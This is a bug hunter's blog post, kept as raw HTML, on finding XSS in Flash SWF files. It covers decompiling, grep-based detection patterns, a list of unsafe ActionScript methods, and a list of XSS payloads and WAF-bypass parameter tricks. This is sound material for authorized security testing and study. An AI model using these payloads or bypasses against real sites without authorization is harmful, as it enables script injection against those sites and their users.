<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="Gwendal Le Coguic">
    <meta name="description" content="Gwendal Le Coguic, web developer and bug hunter">
    <meta name="keywords" content="development,security,researcher,bugbounty,tools,php,python">

    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://10degres.net/images/swf-testing-xss.png"/>

<meta name="twitter:title" content="Find vulnerabilities in Flash SWF"/>
<meta name="twitter:description" content="As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/"/>
<meta name="twitter:site" content="@10degres"/>
<meta name="twitter:creator" content="@gwendallecoguic"/>

    <meta property="og:title" content="Find vulnerabilities in Flash SWF" />
<meta property="og:description" content="As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://10degres.net/find-vulnerabilities-in-flash-swf/" />

<meta property="og:image" content="http://10degres.net/images/swf-testing-xss.png" />
<meta property="article:published_time" content="2018-05-17T00:00:00+00:00" />
<meta property="article:modified_time" content="2018-05-17T00:00:00+00:00" /><meta property="og:site_name" content="10degres" />


    
      <base href="http://10degres.net/find-vulnerabilities-in-flash-swf/">
    
    <title>
  Find vulnerabilities in Flash SWF · 10degres
</title>

    
      <link rel="canonical" href="http://10degres.net/find-vulnerabilities-in-flash-swf/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />

    
      
      
      <link rel="stylesheet" href="http://10degres.net/assets/css/coder.min.3d8325016df2bf0f0e874e28c83131f668a953cb3245cf9391fae4ff5b76b2ed.css" integrity="sha256-PYMlAW3yvw8Oh04oyDEx9mipU8syRc&#43;Tkfrk/1t2su0=" crossorigin="anonymous" media="screen" />
    

    

    

    
      <link rel="stylesheet" href="http://10degres.net/assets/css/custom.css" />
    

    <link rel="icon" type="image/png" href="http://10degres.net/assets/img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="http://10degres.net/assets/img/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.91.0" />
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="http://10degres.net/">
      10degres
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="http://10degres.net/posts/">Blog</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="http://10degres.net/cves/">CVEs</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="http://10degres.net/services/">Services</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="http://10degres.net/press/">Press</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="http://10degres.net/about/">About</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Find vulnerabilities in Flash SWF</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2018-05-17T00:00:00Z'>
                May 17, 2018
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              4 minutes read
            </span>
          </div>
          
          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="http://10degres.net/tags/flash/">flash</a>
      <span class="separator">•</span>
    <a href="http://10degres.net/tags/xss/">xss</a></div>

        </div>
      </header>

      <div>
        <p>As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/</p>
<p>Below my reminder based on several articles I found here and there. For more details, I linked some of them at the very bottom of this page.</p>
<h2 id="tools">Tools</h2>
<p><a href="https://www.free-decompiler.com/flash/">JPEXS Free Flash Decompiler</a> to decompile the SWF files, read the code source and fully export it.<br>
<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Projector content</a> standalone flash player I configured in JPEXS.<br>
<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Projector content debugger</a> debug version of the standalone flash player I configured in JPEXS.<br>
<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Plugin content debugger</a> to enable the debug mode of the flash plugin of the browser.<br>
<a href="http://10degres.net/assets/testflash.txt">testflash.php</a> a quick page I wrote to perform local tests.</p>
<p>Using the debug version of the flash player (standalone or browser) and with the help of the <a href="https://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7fc9.html">MacroMedia config file</a>, the flash log is enabled and will contain the trace setted by the developper:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat ~/mm.cfg
ErrorReportingEnable=1
TraceOutputFileEnable=1
MaxWarnings=50
AS3Trace=1
</code></pre></div><h2 id="get-the-code">Get the code</h2>
<p>1/ Download the SWF:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget &lt;url&gt;
</code></pre></div><p>2/ Open SWF file with JPEXS Free Flash Decompiler</p>
<p>3/ Select all:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+a
</code></pre></div><p>4/ Export:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">right click -&gt; export selection
</code></pre></div><p>5/ Remove duplicate files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">find &lt;export_dir&gt; -type f -name &#34;*_[0123456789]*&#34; -exec rm {} \;
</code></pre></div><p><img src="http://10degres.net/images/swf-testing-jpexs.png" alt="SWF testing JPEXS"></p>
<h2 id="extract-datas">Extract datas</h2>
<p>Find comments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -c
</code></pre></div><p>Find hash or interesting keywords:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -k
</code></pre></div><p>Find endpoints:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1
</code></pre></div><p>Find almost everything that could be interesting with <code>flash-regexp.sh</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
target_dir<span style="color:#f92672">=</span>$1

cat <span style="color:#e6db74">&#34;flash-regexp.txt&#34;</span> | <span style="color:#66d9ef">while</span> read -r r; <span style="color:#66d9ef">do</span>
	echo <span style="color:#e6db74">&#34;</span>$r<span style="color:#e6db74">&#34;</span> | awk -F <span style="color:#e6db74">&#34;;;&#34;</span> <span style="color:#e6db74">&#39;{print $1&#34; : &#34;$2}&#39;</span>
	reg<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>echo <span style="color:#e6db74">&#34;</span>$r<span style="color:#e6db74">&#34;</span> | awk -F <span style="color:#e6db74">&#34;;;&#34;</span> <span style="color:#e6db74">&#39;{print $3}&#39;</span><span style="color:#e6db74">`</span>
	escape_reg<span style="color:#f92672">=</span>$reg
	escape_reg<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $escape_reg | sed <span style="color:#e6db74">&#34;s/\&#34;/\\\\\&#34;/g&#34;</span><span style="color:#66d9ef">)</span>
	echo $escape_reg
	egrep --color -ri <span style="color:#e6db74">&#34;</span>$escape_reg<span style="color:#e6db74">&#34;</span> $target_dir
	echo
	echo
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Which is basically a multitude of grep based on a list I found <a href="http://www.bishopfox.com/dictionaries/Flash%20Regexes.txt">there</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Flash XSS (HIGH);;clicktag XSS;;geturl\(.*clicktag.*\)
Flash XSS (HIGH);;getURL XSS;;geturl\(.*(_root\.|_level0\.|_global\.).*\)
Flash XSS (HIGH);;getURL XSS;;geturl\([^&#39;&#34;.]*\)
Flash XSS (HIGH);;navigateToURL XSS;;navigateToURL\([^&#39;&#34;.]*\)
Flash XSS (HIGH);;ExternalInterface.call XSS;;ExternalInterface\.call\(.*(_root\.|_level0\.|_global\.).*\)
...
...
</code></pre></div><p><img src="http://10degres.net/images/swf-testing-extract-datas.png" alt="SWF testing extract datas"></p>
<h2 id="manual-analysis">Manual analysis</h2>
<p>Enable and check the Flash log:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd /usr/lib/adobe-flashplugin
cp libflashplayer_debug.so libflashplayer.so
tail -f ~/.macromedia/Flash_Player/Logs/flashlog.txt | grep -a -v AVMINF
</code></pre></div><p>Locally run the SWF file with all parameters in the test page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">firefox http://127.0.0.1/testflash/testflash.php?__swf=&lt;MYSWF_FILE&gt;.swf&amp;param1=value1&amp;param2=value2...
</code></pre></div><p>Find parameters in JPEXS and track them one by one from the initialization to the final use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; flashvars
</code></pre></div><p>Find dangerous methods in JPEXS and reverse track the parameters:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; geturl
</code></pre></div><p><img src="http://10degres.net/images/swf-testing-flash-log.jpg" alt="SWF testing flash log"></p>
<h2 id="take-care-of">Take care of</h2>
<p>Unsafe methods in Actionscript:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">loadVariables()
getURL()
getURLBlankVar()
getURLParentVar()
getURLJSParam()
loadMovie()
loadMovieVar()
loadMovieNum()
FScrollPane.loadScrollContent()
LoadVars.load 
LoadVars.send 
XML.load ( &#39;url&#39; )
XML.sendAndLoad ( &#39;url&#39; )
LoadVars.load ( &#39;url&#39; )
LoadVars.send ( &#39;url&#39; ) 
Sound.loadSound( &#39;url&#39; , isStreaming );
NetStream.play( &#39;url&#39; );
flash.external.ExternalInterface.call(_root.callback)
externalInterface.addCallback
htmlText
htmlVar
loadClip
AddDLL
</code></pre></div><p>Functions that can load objects, or send/receive/store data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">XMLLoader, AMFService, SWFLoader, loadVariables, loadMovie,
loadMovieNum, LoadVars.load, LoadVars.send, NetStream.play,
getDefinition, getDefinition, FScrollPane.loadScrollContent, XML.load,
Sound.loadSound, NetStream.play, URLRequest, URLLoader,
URLStream, LocalConnection, SharedObject
</code></pre></div><p>Uninitialized global vars (ActionScript 2):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">_root
_global
_level0
</code></pre></div><p>Uninitialized global vars (ActionScript 3):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root
loaderInfo
parameters
</code></pre></div><h2 id="xss-payloads">XSS payloads</h2>
<p>AS2 getURL() / AS3 NavigateToURL():</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">javascript:alert(1)
javascript://adobe.com%0aalert(1)
data:text/html,&lt;script&gt;alert(1)&lt;script&gt;
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
</code></pre></div><p>AS2 fscommand, AS2 .watch, AS3 externalInterface.Call (like PHP preg_replace/e issue):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alert`0`
%#jsinitfunctio%gn=alert%601%60
\&#34;))-alert(1)}catch(e){}//
\&#34;))} catch(e) {alert(1);}//
\&#39;);alert(document.domain);
\&#34;));throw_error()}catch(e){alert(document.domain))}//
\&#34;);function%20someFunction(a){}prompt(1)//
&#34;%5D);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
flash.external.ExternalInterface.call(&#34;alert&#34;, &#39;1&#39;);
</code></pre></div><p>HTML injection:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;img src=&#39;javascript:alert(1)//.swf&#39;&gt;
&lt;a href=asfunction:System.Security.allowDomain,www.example.com&gt;
&lt;a href=asfunction:getURL,javascript:alert(1)&gt;
</code></pre></div><p>WAF bypass:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">param1=value1
pa%Xram1=val%Yue1
pa%=ram1=val%#ue1
pa%AXram1=val%B#ue1
File.swf?%#param1=value1&amp;p2=v2
%#jsinitfunctio%gn=alert%601%60
</code></pre></div><p>Trigger Error:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xxx&#34;&#39;(){}\&#34;\&#39;(){}\\&#39;\\&#34;(){}xxx
</code></pre></div><h2 id="other-tools">Other tools</h2>
<p><a href="https://www.adobe.com/devnet/flex/flex-sdk-download.html">Adobe Flex SDK</a> to compile Actionscript (mxmlc).<br>
<a href="https://github.com/irsdl/updated-SWFIntruder">SWFIntruder</a> to test XSS.<br>
<a href="https://cure53.de/flashbang">Flashbang</a> to find FlashVars.</p>
<h2 id="external-resources">External resources</h2>
<ul>
<li><a href="https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/">Analysing SWF files for vulnerabilities by MLT</a></li>
<li><a href="http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf">Flash it baby! by IRSDL</a></li>
<li><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/">Finding XSS vulnerabilities in flash files by Smiegles</a></li>
<li><a href="https://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html">Setting a crossdomain.xml file for HTTP streaming</a></li>
</ul>
      </div>

      <footer>
        


      </footer>
    </article>

    
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
    
    
    
  </section>
</footer>

    </main>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-61485350-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
      <script src="http://10degres.net/assets/js/scripts.js"></script>
    

  </body>

</html>
